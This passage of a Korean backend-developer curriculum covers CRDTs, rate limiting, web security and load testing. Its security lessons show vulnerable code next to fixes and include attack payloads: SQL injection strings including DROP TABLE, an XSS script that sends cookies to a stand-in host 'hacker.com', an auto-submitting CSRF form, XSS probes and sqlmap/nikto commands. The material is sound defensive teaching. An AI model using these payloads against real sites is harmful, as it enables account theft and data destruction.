// LWW-Element-Set (Last-Write-Wins Set)
// 실시간 협업 태그 편집에 사용
class LWWSet {
  constructor() {
    this.adds = {}; // { 'tag1': timestamp }
    this.removes = {}; // { 'tag1': timestamp }
  }

  add(element) {
    this.adds[element] = Date.now();
  }

  remove(element) {
    this.removes[element] = Date.now();
  }

  has(element) {
    const addTime = this.adds[element] || 0;
    const removeTime = this.removes[element] || 0;
    return addTime > removeTime; // 더 최근 타임스탬프 우선
  }

  merge(other) {
    for (const [elem, time] of Object.entries(other.adds)) {
      this.adds[elem] = Math.max(this.adds[elem] || 0, time);
    }
    for (const [elem, time] of Object.entries(other.removes)) {
      this.removes[elem] = Math.max(this.removes[elem] || 0, time);
    }
  }
}`},{heading:"6. 실전: 분산 속도 제한 (Rate Limiting)",code:`// Redis를 이용한 분산 Rate Limiter
const rateLimit = require('express-rate-limit');
const RedisStore = require('rate-limit-redis');

const limiter = rateLimit({
  store: new RedisStore({
    client: redis,
    prefix: 'rl:'
  }),
  windowMs: 60 * 1000, // 1분
  max: 100, // 100 요청
  message: '너무 많은 요청입니다. 1분 후 다시 시도해주세요.',
  standardHeaders: true,
  legacyHeaders: false
});

app.use('/api/', limiter);

// Sliding Window Log 알고리즘 (더 정확한 제한)
async function checkRateLimit(userId, limit = 100, window = 60) {
  const key = \`rate:\${userId}\`;
  const now = Date.now();
  const windowStart = now - (window * 1000);

  // 1. 오래된 기록 삭제
  await redis.zremrangebyscore(key, 0, windowStart);

  // 2. 현재 윈도우 내 요청 수 확인
  const count = await redis.zcard(key);

  if (count >= limit) {
    return false; // 제한 초과
  }

  // 3. 현재 요청 기록
  await redis.zadd(key, now, \`\${now}:\${Math.random()}\`);
  await redis.expire(key, window);

  return true; // 허용
}

app.post('/api/action', async (req, res) => {
  const allowed = await checkRateLimit(req.user.id, 10, 60);

  if (!allowed) {
    return res.status(429).json({
      error: '1분에 10번까지만 가능합니다.'
    });
  }

  // 비즈니스 로직
});`},{heading:"⚡ 고급 실습 과제",checklist:["Redlock으로 다중 Redis 분산 잠금 구현 후 한 Redis 다운시켜도 정상 동작 확인","이벤트 소싱 패턴으로 은행 계좌 시스템 구현 (입금/출금 이벤트)","CQRS 패턴으로 주문 시스템 구현 (쓰기용 MySQL, 읽기용 MongoDB)","G-Counter로 분산 좋아요 카운터 구현 후 여러 서버 동기화","Sliding Window Log 알고리즘으로 API Rate Limiter 구현 (분당 100회)"]}]}}},{id:"3-3",name:"보안 기초",goal:"기본적인 보안 위협을 이해하고 대응할 수 있다",hours:12,keywords:["web security","SQL injection","authentication"],tasks:["SQL Injection 공격 시뮬레이션","현재 사용 중인 인증 방식 파악","SSL 인증서 만료일 확인"],content:{beginner:{title:"초급: 주요 웹 보안 위협 이해하고 기본 방어하기",sections:[{heading:"📚 학습 목표",content:"OWASP Top 10 중 핵심 공격을 이해하고, 기본적인 방어 코드를 작성할 수 있다."},{heading:"1. SQL Injection (가장 위험한 공격)",content:"악의적인 SQL 코드를 주입하여 데이터베이스를 조작하는 공격입니다.",code:`// 취약한 코드 (절대 이렇게 하지 마세요!)
app.post('/login', (req, res) => {
  const query = \`
    SELECT * FROM users
    WHERE username = '\${req.body.username}'
    AND password = '\${req.body.password}'
  \`;

  db.query(query, (err, users) => {
    if (users.length > 0) {
      res.json({ success: true });
    }
  });
});

// 공격 시나리오:
// username: admin' --
// password: (아무거나)

// 실제 실행되는 쿼리:
// SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
// '--'는 주석이므로 비밀번호 검증이 무시됨!

// 더 위험한 공격:
// username: admin'; DROP TABLE users; --
// 실행: SELECT * FROM users WHERE username = 'admin'; DROP TABLE users; --'
// 결과: users 테이블 삭제!`},{heading:"2. SQL Injection 방어 - Prepared Statement 사용",code:`// 안전한 코드 (Parameterized Query)
app.post('/login', async (req, res) => {
  const query = 'SELECT * FROM users WHERE username = ? AND password = ?';

  const [users] = await db.query(query, [
    req.body.username,
    req.body.password
  ]);

  if (users.length > 0) {
    res.json({ success: true });
  } else {
    res.status(401).json({ error: '로그인 실패' });
  }
});

// 작동 원리:
// 1. ?는 플레이스홀더
// 2. 두 번째 인자의 값이 자동으로 이스케이프됨
// 3. username에 "admin' --"를 넣어도 문자열로 처리
// 4. SELECT * FROM users WHERE username = 'admin\\' --' ... (안전!)

// ORM 사용 시 (더 안전)
const user = await User.findOne({
  where: {
    username: req.body.username,
    password: req.body.password
  }
});`},{heading:"3. XSS (Cross-Site Scripting) 공격",content:"악의적인 JavaScript를 삽입하여 다른 사용자의 브라우저에서 실행시키는 공격입니다.",code:`// 취약한 코드
app.get('/profile/:userId', async (req, res) => {
  const user = await db.query('SELECT * FROM users WHERE id = ?', [req.params.userId]);

  res.send(\`
    <h1>프로필</h1>
    <p>이름: \${user.name}</p>
    <p>소개: \${user.bio}</p>
  \`);
});

// 공격 시나리오:
// 사용자가 bio에 입력:
// <script>fetch('https://hacker.com/steal?cookie='+document.cookie)<\/script>

// 다른 사용자가 프로필 방문 시:
// 1. 스크립트가 실행됨
// 2. 세션 쿠키가 해커 서버로 전송됨
// 3. 해커가 쿠키로 로그인 가능 (계정 탈취!)`},{heading:"4. XSS 방어 - HTML 이스케이핑",code:`// 안전한 코드 (HTML Escaping)
const escapeHtml = (text) => {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
};

app.get('/profile/:userId', async (req, res) => {
  const user = await db.query('SELECT * FROM users WHERE id = ?', [req.params.userId]);

  res.send(\`
    <h1>프로필</h1>
    <p>이름: \${escapeHtml(user.name)}</p>
    <p>소개: \${escapeHtml(user.bio)}</p>
  \`);
});

// 결과:
// <script>alert(1)<\/script>
// → &lt;script&gt;alert(1)&lt;/script&gt; (화면에 그대로 표시)

// React는 자동으로 이스케이프:
function Profile({ user }) {
  return (
    <div>
      <h1>프로필</h1>
      <p>이름: {user.name}</p>
      <p>소개: {user.bio}</p>
    </div>
  );
}
// React는 {}안의 값을 자동으로 이스케이프 (안전!)`},{heading:"5. HTTPS와 SSL/TLS 인증서",steps:[{label:"인증서 만료일 확인",code:`# 방법 1: OpenSSL 명령어
openssl s_client -connect yourdomain.com:443 -servername yourdomain.com 2>/dev/null | openssl x509 -noout -dates

# 출력:
# notBefore=Jan  1 00:00:00 2024 GMT
# notAfter=Apr  1 23:59:59 2024 GMT  ← 만료일!

# 방법 2: 브라우저
# 1. 사이트 접속
# 2. 주소창 자물쇠 아이콘 클릭
# 3. "인증서" 클릭
# 4. "유효 기간" 확인`},{label:"Let's Encrypt로 무료 인증서 발급",code:`# Certbot 설치 (Ubuntu)
sudo apt install certbot python3-certbot-nginx

# 인증서 발급 및 Nginx 자동 설정
sudo certbot --nginx -d yourdomain.com -d www.yourdomain.com

# 자동 갱신 설정 (90일마다 필요)
sudo certbot renew --dry-run

# Cron으로 자동화
sudo crontab -e
# 매일 새벽 3시에 갱신 체크
0 3 * * * certbot renew --quiet`}]},{heading:"6. 안전한 비밀번호 저장 (해싱)",code:`// 절대 안 됨: 평문 저장
await db.query('INSERT INTO users (username, password) VALUES (?, ?)', [
  username,
  password // 그대로 저장 ← 위험!
]);

// 안전: bcrypt로 해싱
const bcrypt = require('bcrypt');

// 회원가입
app.post('/signup', async (req, res) => {
  const saltRounds = 10;
  const hashedPassword = await bcrypt.hash(req.body.password, saltRounds);

  await db.query('INSERT INTO users (username, password) VALUES (?, ?)', [
    req.body.username,
    hashedPassword // 해시된 값 저장
  ]);

  res.json({ success: true });
});

// 로그인
app.post('/login', async (req, res) => {
  const [users] = await db.query('SELECT * FROM users WHERE username = ?', [
    req.body.username
  ]);

  if (users.length === 0) {
    return res.status(401).json({ error: '사용자 없음' });
  }

  const match = await bcrypt.compare(req.body.password, users[0].password);

  if (match) {
    res.json({ success: true });
  } else {
    res.status(401).json({ error: '비밀번호 틀림' });
  }
});

// DB에 저장되는 예시:
// username: admin
// password: $2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
// → 원본 비밀번호 복구 불가능!`},{heading:"💡 초급 실습 과제",checklist:["취약한 로그인 코드에 SQL Injection 공격 시도 후 성공 확인","Prepared Statement로 수정 후 공격 방어 확인","사용자 입력을 그대로 출력하여 XSS 공격 재현","HTML 이스케이핑 적용 후 스크립트 실행 안 되는지 확인","현재 운영 중인 사이트의 SSL 인증서 만료일 확인"]}]},intermediate:{title:"중급: 인증/인가 시스템과 CSRF 방어",sections:[{heading:"📚 학습 목표",content:"JWT 인증을 구현하고, CSRF와 같은 세션 관련 공격을 방어할 수 있다."},{heading:"1. JWT (JSON Web Token) 인증 구현",code:`const jwt = require('jsonwebtoken');
const SECRET_KEY = process.env.JWT_SECRET; // 환경변수로 관리

// 로그인 (토큰 발급)
app.post('/login', async (req, res) => {
  const [users] = await db.query('SELECT * FROM users WHERE username = ?', [
    req.body.username
  ]);

  if (users.length === 0) {
    return res.status(401).json({ error: '인증 실패' });
  }

  const match = await bcrypt.compare(req.body.password, users[0].password);

  if (!match) {
    return res.status(401).json({ error: '인증 실패' });
  }

  // JWT 토큰 생성
  const token = jwt.sign(
    {
      userId: users[0].id,
      username: users[0].username,
      role: users[0].role
    },
    SECRET_KEY,
    { expiresIn: '1h' } // 1시간 후 만료
  );

  res.json({ token });
});

// 인증 미들웨어
function authenticateToken(req, res, next) {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1]; // Bearer TOKEN

  if (!token) {
    return res.status(401).json({ error: '토큰 없음' });
  }

  jwt.verify(token, SECRET_KEY, (err, user) => {
    if (err) {
      return res.status(403).json({ error: '유효하지 않은 토큰' });
    }

    req.user = user; // 토큰에서 추출한 정보
    next();
  });
}

// 보호된 라우트
app.get('/api/profile', authenticateToken, async (req, res) => {
  const [users] = await db.query('SELECT * FROM users WHERE id = ?', [
    req.user.userId
  ]);

  res.json(users[0]);
});

// Frontend에서 사용
fetch('/api/profile', {
  headers: {
    'Authorization': \`Bearer \${token}\`
  }
})`},{heading:"2. Refresh Token으로 보안 강화",code:`// Access Token (짧은 만료 시간) + Refresh Token (긴 만료 시간)
app.post('/login', async (req, res) => {
  // ... 인증 로직

  const accessToken = jwt.sign(
    { userId: user.id },
    ACCESS_TOKEN_SECRET,
    { expiresIn: '15m' } // 15분
  );

  const refreshToken = jwt.sign(
    { userId: user.id },
    REFRESH_TOKEN_SECRET,
    { expiresIn: '7d' } // 7일
  );

  // Refresh Token을 DB에 저장
  await db.query('UPDATE users SET refresh_token = ? WHERE id = ?', [
    refreshToken,
    user.id
  ]);

  res.json({ accessToken, refreshToken });
});

// Access Token 갱신 엔드포인트
app.post('/refresh', async (req, res) => {
  const { refreshToken } = req.body;

  if (!refreshToken) {
    return res.status(401).json({ error: '리프레시 토큰 없음' });
  }

  // DB에 저장된 토큰과 일치하는지 확인
  const [users] = await db.query('SELECT * FROM users WHERE refresh_token = ?', [
    refreshToken
  ]);

  if (users.length === 0) {
    return res.status(403).json({ error: '유효하지 않은 토큰' });
  }

  jwt.verify(refreshToken, REFRESH_TOKEN_SECRET, (err, user) => {
    if (err) {
      return res.status(403).json({ error: '만료된 토큰' });
    }

    const newAccessToken = jwt.sign(
      { userId: user.userId },
      ACCESS_TOKEN_SECRET,
      { expiresIn: '15m' }
    );

    res.json({ accessToken: newAccessToken });
  });
});

// 로그아웃 (토큰 무효화)
app.post('/logout', authenticateToken, async (req, res) => {
  await db.query('UPDATE users SET refresh_token = NULL WHERE id = ?', [
    req.user.userId
  ]);

  res.json({ success: true });
});`},{heading:"3. CSRF (Cross-Site Request Forgery) 공격과 방어",content:"사용자가 로그인한 상태에서 악의적인 요청을 자동으로 보내는 공격입니다.",code:`// 공격 시나리오:
// 1. 사용자가 example.com에 로그인 (쿠키 저장됨)
// 2. 악의적인 사이트 evil.com 방문
// 3. evil.com에 숨겨진 코드:
<form action="https://example.com/transfer" method="POST">
  <input type="hidden" name="to" value="hacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();<\/script>

// 결과:
// - 사용자 모르게 10000원이 해커에게 송금됨
// - 브라우저가 자동으로 쿠키를 포함하여 요청을 보냄

// 방어 1: CSRF 토큰 사용
const csurf = require('csurf');
const csrfProtection = csurf({ cookie: true });

app.get('/form', csrfProtection, (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

app.post('/transfer', csrfProtection, (req, res) => {
  // CSRF 토큰이 유효하지 않으면 자동으로 403 에러
  // 유효한 경우에만 여기 도달
  res.json({ success: true });
});

// HTML:
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="<%= csrfToken %>">
  <input name="to">
  <input name="amount">
  <button type="submit">송금</button>
</form>

// 방어 2: SameSite 쿠키 속성
res.cookie('sessionId', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict' // 다른 사이트에서의 요청에는 쿠키 안 보냄
});`},{heading:"4. 권한 관리 (Authorization)",code:`// Role-Based Access Control (RBAC)
const roles = {
  admin: ['read', 'write', 'delete', 'manage_users'],
  editor: ['read', 'write'],
  viewer: ['read']
};

function authorize(requiredPermission) {
  return (req, res, next) => {
    const userRole = req.user.role; // JWT에서 추출
    const permissions = roles[userRole];

    if (!permissions || !permissions.includes(requiredPermission)) {
      return res.status(403).json({
        error: '권한이 없습니다.'
      });
    }

    next();
  };
}

// 사용
app.delete('/api/posts/:id',
  authenticateToken,
  authorize('delete'), // delete 권한 필요
  async (req, res) => {
    await db.query('DELETE FROM posts WHERE id = ?', [req.params.id]);
    res.json({ success: true });
  }
);

// 더 세밀한 제어: 본인 것만 수정 가능
app.put('/api/posts/:id',
  authenticateToken,
  async (req, res) => {
    const [posts] = await db.query('SELECT * FROM posts WHERE id = ?', [
      req.params.id
    ]);

    if (posts.length === 0) {
      return res.status(404).json({ error: '게시글 없음' });
    }

    // 본인 글이거나 관리자인 경우에만 허용
    if (posts[0].author_id !== req.user.userId && req.user.role !== 'admin') {
      return res.status(403).json({ error: '권한 없음' });
    }

    await db.query('UPDATE posts SET content = ? WHERE id = ?', [
      req.body.content,
      req.params.id
    ]);

    res.json({ success: true });
  }
);`},{heading:"5. Rate Limiting으로 브루트포스 방어",code:`const rateLimit = require('express-rate-limit');

// 로그인 시도 제한
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15분
  max: 5, // 5번 시도
  message: '너무 많은 로그인 시도. 15분 후 다시 시도하세요.',
  skipSuccessfulRequests: true // 성공하면 카운트 안 함
});

app.post('/login', loginLimiter, async (req, res) => {
  // 로그인 로직
});

// IP별 제한 + 사용자별 제한
const RedisStore = require('rate-limit-redis');

const apiLimiter = rateLimit({
  store: new RedisStore({ client: redis }),
  windowMs: 60 * 1000,
  max: async (req) => {
    if (req.user && req.user.role === 'admin') {
      return 1000; // 관리자는 1000회
    }
    return 100; // 일반 사용자는 100회
  },
  keyGenerator: (req) => {
    // 로그인 사용자는 userId, 비로그인은 IP
    return req.user ? \`user:\${req.user.userId}\` : \`ip:\${req.ip}\`;
  }
});

app.use('/api/', apiLimiter);`},{heading:"⚡ 중급 실습 과제",checklist:["JWT 인증 시스템 구현 후 Postman으로 토큰 확인","만료된 토큰으로 요청 시 403 에러 발생하는지 테스트","CSRF 토큰 없이 요청 시 차단되는지 확인","일반 사용자로 관리자 전용 API 호출 시 403 확인","로그인 5번 실패 후 15분 제한되는지 확인"]}]},advanced:{title:"고급: 보안 모니터링과 침투 테스트",sections:[{heading:"📚 학습 목표",content:"보안 취약점을 자동으로 탐지하고, 침투 테스트로 시스템을 강화할 수 있다."},{heading:"1. OWASP ZAP로 자동 취약점 스캔",steps:[{label:"설치 및 기본 스캔",code:`# Docker로 OWASP ZAP 실행
docker run -t owasp/zap2docker-stable zap-baseline.py -t https://your-app.com

# 결과:
# WARN-NEW: SQL Injection (GET parameter 'id')
# WARN-NEW: Cross Site Scripting (Reflected) (POST parameter 'comment')
# WARN-NEW: Missing Anti-CSRF Tokens (POST /api/transfer)

# HTML 리포트 생성
docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable \\
  zap-full-scan.py -t https://your-app.com -r report.html`},{label:"CI/CD 파이프라인 통합",code:`# .github/workflows/security-scan.yml
name: Security Scan
on:
  pull_request:
    branches: [main]

jobs:
  zap_scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Run ZAP Scan
        run: |
          docker run -v \${GITHUB_WORKSPACE}:/zap/wrk/:rw \\
            -t owasp/zap2docker-stable \\
            zap-baseline.py -t \${{ secrets.STAGING_URL }} \\
            -r zap-report.html

      - name: Upload Report
        uses: actions/upload-artifact@v3
        with:
          name: zap-report
          path: zap-report.html

      # 심각한 취약점 발견 시 PR 차단
      - name: Check Vulnerabilities
        run: |
          if grep -q "FAIL-NEW" zap-report.html; then
            echo "Critical vulnerabilities found!"
            exit 1
          fi`}]},{heading:"2. Content Security Policy (CSP) 설정",code:`// XSS 공격을 원천 차단하는 HTTP 헤더
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: [
      "'self'",
      "'unsafe-inline'", // React의 인라인 스크립트 허용 (최소화 권장)
      "https://cdn.jsdelivr.net"
    ],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'", "https://api.example.com"],
    fontSrc: ["'self'", "https://fonts.gstatic.com"],
    objectSrc: ["'none'"],
    upgradeInsecureRequests: []
  }
}));

// 응답 헤더:
// Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.jsdelivr.net; ...

// 효과:
// 1. 허용되지 않은 도메인의 스크립트 실행 차단
// 2. 인라인 스크립트 차단 (XSS 방어)
// 3. eval() 같은 위험한 함수 차단

// 위반 리포트 수집
app.use(helmet.contentSecurityPolicy({
  directives: {
    // ... 위와 동일
    reportUri: '/api/csp-report'
  }
}));

app.post('/api/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  console.log('CSP Violation:', req.body);
  // Sentry 등으로 전송
  res.status(204).end();
});`},{heading:"3. 보안 로그 수집 및 분석",code:`// Winston으로 보안 이벤트 로깅
const winston = require('winston');

const securityLogger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'security.log' }),
    new winston.transports.Console()
  ]
});

// 의심스러운 활동 로깅
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  const [users] = await db.query('SELECT * FROM users WHERE username = ?', [username]);

  if (users.length === 0) {
    securityLogger.warn('Login attempt with non-existent user', {
      username,
      ip: req.ip,
      userAgent: req.headers['user-agent'],
      timestamp: new Date()
    });
    return res.status(401).json({ error: '인증 실패' });
  }

  const match = await bcrypt.compare(password, users[0].password);

  if (!match) {
    securityLogger.warn('Failed login attempt', {
      userId: users[0].id,
      username,
      ip: req.ip,
      timestamp: new Date()
    });

    // 5번 실패 시 계정 잠금
    await db.query(
      'UPDATE users SET failed_attempts = failed_attempts + 1 WHERE id = ?',
      [users[0].id]
    );

    const updatedUser = await db.query('SELECT * FROM users WHERE id = ?', [users[0].id]);
    if (updatedUser[0].failed_attempts >= 5) {
      securityLogger.error('Account locked due to multiple failed attempts', {
        userId: users[0].id,
        ip: req.ip
      });
      await db.query('UPDATE users SET locked_until = ? WHERE id = ?', [
        new Date(Date.now() + 30 * 60 * 1000), // 30분 잠금
        users[0].id
      ]);
    }

    return res.status(401).json({ error: '인증 실패' });
  }

  // 성공 시 실패 카운터 리셋
  await db.query('UPDATE users SET failed_attempts = 0 WHERE id = ?', [users[0].id]);

  securityLogger.info('Successful login', {
    userId: users[0].id,
    ip: req.ip
  });

  // JWT 발급...
});

// 권한 없는 접근 시도
app.use((err, req, res, next) => {
  if (err.status === 403) {
    securityLogger.warn('Unauthorized access attempt', {
      userId: req.user?.userId,
      path: req.path,
      method: req.method,
      ip: req.ip
    });
  }
  next(err);
});`},{heading:"4. 침투 테스트 (Penetration Testing)",code:`# sqlmap으로 SQL Injection 테스트
sqlmap -u "https://your-app.com/api/users?id=1" --batch --risk=3 --level=5

# 결과:
# [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
# [INFO] GET parameter 'id' is vulnerable. Do you want to keep testing? [y/N] y
# sqlmap identified the following injection point(s):
# Parameter: id (GET)
#   Type: boolean-based blind
#   Payload: id=1 AND 1=1

# Burp Suite로 XSS 테스트
# 1. Burp Suite 실행
# 2. 브라우저 프록시 설정
# 3. Intruder 탭에서 페이로드 설정:
<script>alert(1)<\/script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(String.fromCharCode(88,83,83))<\/script>

# 4. Attack 실행 후 응답 확인

# Nikto 웹 서버 스캔
nikto -h https://your-app.com

# 결과:
# + Server: nginx/1.18.0
# + The anti-clickjacking X-Frame-Options header is not present.
# + The X-Content-Type-Options header is not set.
# + No CGI Directories found
# + OSVDB-3268: /backup/: Directory indexing found.

# 보안 헤더 추가
app.use(helmet({
  frameguard: { action: 'deny' }, // Clickjacking 방지
  contentTypeOptions: true, // MIME 타입 스니핑 방지
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));`},{heading:"5. Secrets 관리 및 환경변수 보안",code:`// .env 파일 사용 (절대 Git에 커밋하지 마세요!)
// .env
DATABASE_PASSWORD=super_secret_password
JWT_SECRET=very_long_random_string_here
API_KEY=sk-1234567890abcdef

// .gitignore에 추가
echo ".env" >> .gitignore

// 코드에서 사용
require('dotenv').config();

const dbPassword = process.env.DATABASE_PASSWORD;
const jwtSecret = process.env.JWT_SECRET;

// Docker Secrets 사용 (프로덕션)
# docker-compose.yml
version: '3.8'
services:
  app:
    image: myapp
    secrets:
      - db_password
      - jwt_secret

secrets:
  db_password:
    file: ./secrets/db_password.txt
  jwt_secret:
    file: ./secrets/jwt_secret.txt

// 코드에서 읽기
const fs = require('fs');

const dbPassword = fs.readFileSync('/run/secrets/db_password', 'utf8').trim();
const jwtSecret = fs.readFileSync('/run/secrets/jwt_secret', 'utf8').trim();

// AWS Secrets Manager 사용 (클라우드)
const AWS = require('aws-sdk');
const secretsManager = new AWS.SecretsManager({ region: 'us-east-1' });

async function getSecret(secretName) {
  const data = await secretsManager.getSecretValue({ SecretId: secretName }).promise();
  return JSON.parse(data.SecretString);
}

const secrets = await getSecret('prod/myapp/credentials');
const dbPassword = secrets.DATABASE_PASSWORD;`},{heading:"6. 보안 체크리스트 자동화",code:`# npm audit로 의존성 취약점 점검
npm audit

# 결과:
# found 3 vulnerabilities (1 moderate, 2 high) in 1200 scanned packages
#   run \`npm audit fix\` to fix them, or \`npm audit\` for details

# 자동 수정
npm audit fix

# 강제 수정 (breaking changes 포함)
npm audit fix --force

# GitHub Dependabot 활성화
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10

# Snyk로 실시간 모니터링
snyk monitor
# https://app.snyk.io 에서 대시보드 확인

# Pre-commit hook으로 보안 검사
# .husky/pre-commit
#!/bin/sh
npm audit --audit-level=high
if [ $? -ne 0 ]; then
  echo "Security vulnerabilities found! Commit aborted."
  exit 1
fi`},{heading:"⚡ 고급 실습 과제",checklist:["OWASP ZAP으로 전체 앱 스캔 후 발견된 취약점 수정","CSP 헤더 설정 후 외부 스크립트 차단되는지 확인","sqlmap으로 SQL Injection 테스트 후 모든 파라미터 방어 확인","실패한 로그인 시도 5번 후 계정 30분 잠금 구현","GitHub Actions에 보안 스캔 추가하여 취약점 발견 시 PR 차단"]}]}}},{id:"3-4",name:"부하 테스트와 스케일링",goal:"시스템의 한계를 파악하고 확장 계획을 세울 수 있다",hours:10,keywords:["load testing","scalability","performance benchmarking"],tasks:["간단한 부하 테스트 (JMeter 또는 Artillery)","현재 시스템의 동시 접속 한계 측정","서버 증설 계획 작성"],content:{beginner:{title:"초급: 부하 테스트 도구로 시스템 한계 측정하기",sections:[{heading:"📚 학습 목표",content:"부하 테스트의 개념을 이해하고, 간단한 도구로 현재 시스템의 처리 능력을 측정할 수 있다."},{heading:"1. 부하 테스트가 필요한 이유",content:"실제 운영 환경에서 장애가 발생하기 전에 시스템의 한계를 파악해야 합니다.",list:["실제 상황: 평소 100명 → 이벤트 때 1만명 → 서버 다운","테스트로 미리 발견: 500명에서 응답 시간 5초 증가 → 대비 가능","용량 계획 수립: 몇 명까지 감당 가능한지 정확히 알 수 있음","병목 지점 파악: DB? 서버? 네트워크?"]},{heading:"2. Apache Bench로 첫 부하 테스트",steps:[{label:"설치 (대부분 OS에 기본 설치됨)",code:`# macOS/Linux 확인
which ab

# Ubuntu 설치
sudo apt install apache2-utils

# Windows
# https://www.apachelounge.com/download/ 에서 다운로드`},{label:"기본 사용법",code:`# 100개 요청, 동시 10개
ab -n 100 -c 10 https://your-app.com/

# 결과:
Concurrency Level:      10
Time taken for tests:   2.345 seconds
Complete requests:      100
Failed requests:        0
Total transferred:      45600 bytes
Requests per second:    42.64 [#/sec] ← 초당 처리량
Time per request:       234.5 [ms] ← 평균 응답 시간
Time per request:       23.5 [ms] (mean, across all concurrent requests)

# 해석:
- 초당 42개 요청 처리 가능
- 평균 응답 시간 234ms
- 실패 0개 → 안정적`},{label:"부하 증가시키기",code:`# 1000개 요청, 동시 100개
ab -n 1000 -c 100 https://your-app.com/api/products

# 결과:
Requests per second:    25.32 [#/sec] ← 감소!
Time per request:       3950.5 [ms] ← 증가!
Failed requests:        15 ← 실패 발생!

# 문제 발견:
- 동시 접속 100명에서 성능 저하
- 일부 요청 실패 (타임아웃)
- 처리량 42 → 25로 감소 (40% 하락)`}]},{heading:"3. k6로 시나리오 기반 테스트",code:`// k6 설치
// https://k6.io/docs/getting-started/installation/

// test.js
import http from 'k6/http';
import { sleep, check } from 'k6';

export const options = {
  stages: [
    { duration: '30s', target: 20 },  // 30초 동안 20명까지 증가
    { duration: '1m', target: 50 },   // 1분 동안 50명 유지
    { duration: '30s', target: 0 },   // 30초 동안 0명으로 감소
  ],
  thresholds: {
    http_req_duration: ['p(95)<500'], // 95%가 500ms 이내
    http_req_failed: ['rate<0.01'],   // 실패율 1% 이하
  },
};

export default function () {
  const res = http.get('https://your-app.com/api/products');

  check(res, {
    '상태 코드 200': (r) => r.status === 200,
    '응답 시간 < 500ms': (r) => r.timings.duration < 500,
  });

  sleep(1);
}

// 실행
k6 run test.js

// 결과:
     ✓ 상태 코드 200
     ✗ 응답 시간 < 500ms
       ↳  85% — ✓ 4250 / ✗ 750

     http_req_duration..........: avg=450ms min=120ms med=420ms max=2.1s p(95)=680ms ← 임계값 초과!
     http_req_failed............: 0.80% ✓ 40 ✗ 4960 ← 통과
     iterations.................: 5000`},{heading:"4. 동시 접속자 한계 찾기",code:`# 단계별로 부하 증가
# Step 1: 동시 10명
ab -n 100 -c 10 https://your-app.com/
# 결과: 평균 200ms, 실패 0

# Step 2: 동시 50명
ab -n 500 -c 50 https://your-app.com/
# 결과: 평균 400ms, 실패 0

# Step 3: 동시 100명
ab -n 1000 -c 100 https://your-app.com/
# 결과: 평균 1200ms, 실패 5 ← 한계 근접

# Step 4: 동시 200명
ab -n 2000 -c 200 https://your-app.com/
# 결과: 평균 5000ms, 실패 150 ← 한계 초과!

# 결론: 동시 100~150명이 한계`},{heading:"5. 서버 리소스 모니터링",code:`# 테스트 중 서버 리소스 확인
# SSH로 서버 접속 후

# CPU, 메모리 실시간 확인
htop

# 또는
top

# 결과 분석:
CPU:  85% ← 높음
Mem:  3.2G/4G (80%) ← 높음
Load: 4.5, 3.8, 2.1 ← CPU 코어 수보다 높음 (위험)

# Docker 컨테이너별 리소스
docker stats

# 결과:
CONTAINER       CPU %    MEM USAGE
backend         65%      1.8GB ← 가장 높음 (병목!)
mysql           25%      800MB
redis           5%       100MB`},{heading:"6. 간단한 증설 계획",code:`# 현재 상황 분석
- 동시 접속 한계: 100~150명
- 병목: Backend 서버 (CPU 65%, 메모리 1.8GB)
- 목표: 500명 동시 접속

# 해결 방안
1. 수직 확장 (Scale Up)
   - 서버 스펙 업그레이드: 2코어 4GB → 4코어 8GB
   - 예상 효과: 300명까지 가능
   - 비용: 월 $40 → $80

2. 수평 확장 (Scale Out)
   - Backend 서버 2대로 증설 + Load Balancer
   - 예상 효과: 300~600명까지 가능
   - 비용: 월 $40 → $100 (서버 2대 + LB)

3. 최적화 (먼저 시도)
   - 느린 쿼리 개선 (인덱스 추가)
   - Redis 캐싱 도입
   - 예상 효과: 200~250명까지 개선
   - 비용: $0 (기존 인프라)`},{heading:"💡 초급 실습 과제",checklist:["Apache Bench로 메인 페이지 부하 테스트 (100명 동시 접속)","k6로 3단계 부하 테스트 (20→50→100명) 스크립트 작성 및 실행","동시 접속자를 단계별로 증가시켜 한계점 찾기","htop으로 테스트 중 CPU/메모리 사용률 확인","현재 시스템의 한계와 개선 방안 문서 작성 (1페이지)"]}]},intermediate:{title:"중급: 실전 부하 테스트와 CapRover 스케일링",sections:[{heading:"📚 학습 목표",content:"실제 사용자 패턴을 시뮬레이션하고, CapRover에서 앱을 스케일링할 수 있다."},{heading:"1. 실전 시나리오 부하 테스트",code:`// k6로 복잡한 사용자 시나리오 작성
import http from 'k6/http';
import { check, group, sleep } from 'k6';

export const options = {
  stages: [
    { duration: '2m', target: 100 },  // 2분간 100명까지 증가
    { duration: '5m', target: 100 },  // 5분간 100명 유지 (피크 타임)
    { duration: '2m', target: 200 },  // 2분간 200명까지 증가 (이벤트)
    { duration: '3m', target: 200 },  // 3분간 200명 유지
    { duration: '2m', target: 0 },    // 2분간 0명으로 감소
  ],
